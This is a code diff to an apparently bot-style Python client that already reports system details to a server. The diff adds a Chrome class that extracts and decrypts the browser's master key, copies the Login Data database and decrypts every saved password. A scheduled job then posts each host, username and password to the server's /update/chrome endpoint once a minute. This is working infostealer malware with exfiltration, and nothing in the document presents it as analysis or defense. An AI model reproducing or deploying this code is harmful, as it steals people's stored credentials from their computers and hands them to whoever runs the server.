@@ -6,7 +6,13 @@ import time
 import requests
 import base64
 import schedule
+import json
+import shutil
+import sqlite3
+import win32crypt
+from Crypto.Cipher import AES
 
+APP_DATA = os.environ['LOCALAPPDATA']
 API_URL = "http://localhost:4000"
 CONFIG_PATH = "config.txt"
 
@@ -65,8 +71,20 @@ class ApiController():
                 "memory": psutil.virtual_memory().total
             }
 
-            r = requests.post(f"{self.api_url}/update/details/{identifier}", json=post_data)
-            print(r.status_code)
+            requests.post(f"{self.api_url}/update/details/{identifier}", json=post_data)
+
+    def update_chrome(self, identifier, token, data):
+        if self.check_connection():
+            for d in data:
+                post_data = {
+                    "token": token,
+                    "identifier": identifier,
+                    "host": d["host"],
+                    "user": d["user"],
+                    "password": d["pass"]
+                }
+
+                requests.post(f"{self.api_url}/update/chrome/{identifier}", json=post_data)
 
 class FileController():
     def __init__(self):
@@ -94,6 +112,56 @@ class FileController():
         else:
             return False
 
+class Chrome(object):
+    def __init__(self):
+        self.stored = []
+        self.lad = os.environ["LOCALAPPDATA"]
+        self.temp = os.environ["APPDATA"] + "Predat0r"
+
+    def chrome_key(self):
+        with open(os.path.join(self.lad, "Google\\Chrome\\User Data\\Local State"), encoding="utf-8") as k:
+            ck = json.loads(k.read())
+        return win32crypt.CryptUnprotectData(
+            base64.b64decode(ck["os_crypt"]["encrypted_key"])[5:],
+            None,
+            None,
+            None,
+            0)[1]
+
+    def locate_db(self):
+        full_path = os.path.join(APP_DATA, 'Google\\Chrome\\User Data\\Default\\Login Data')
+        temp_path = os.path.join(APP_DATA, 'sqlite_file')
+        if os.path.exists(temp_path): 
+            os.remove(temp_path)
+        shutil.copyfile(full_path, temp_path)
+        return full_path
+
+    def decrypt_pass(self, cont):
+        try:
+            iv = cont[3:15]
+            data = cont[15:]
+            ciph = AES.new(self.chrome_key(), AES.MODE_GCM, iv)
+            decrypted = ciph.decrypt(data)
+            decrypted = decrypted[:-16].decode()
+            return decrypted
+        except:
+            decrypted = win32crypt.CryptUnprotectData(cont, None, None, None, 0)
+            return decrypted[1]
+
+    def dump(self):
+        try:
+            db = self.locate_db()
+            db2 = shutil.copy(db, APP_DATA)
+            conn = sqlite3.connect(db2)
+            cursor = conn.cursor()
+            cursor.execute("SELECT action_url, username_value, password_value  from logins")
+            for item in cursor.fetchall():
+                if item[0] != "":
+                    self.stored.append({"host": item[0], "user": item[1], "pass": self.decrypt_pass(item[2])})
+        except:
+            pass
+        return self.stored
+
 def main():
     api = ApiController()
     fsc = FileController()
@@ -114,6 +182,7 @@ def main():
                 
                 if api.check_account(bot_identifier, bot_token):
                     schedule.every(1).minutes.do(api.update_details, bot_identifier, bot_token)
+                    schedule.every(1).minutes.do(api.update_chrome, bot_identifier, bot_token, Chrome().dump())
                     while True:
                         schedule.run_pending()
                         time.sleep(1)
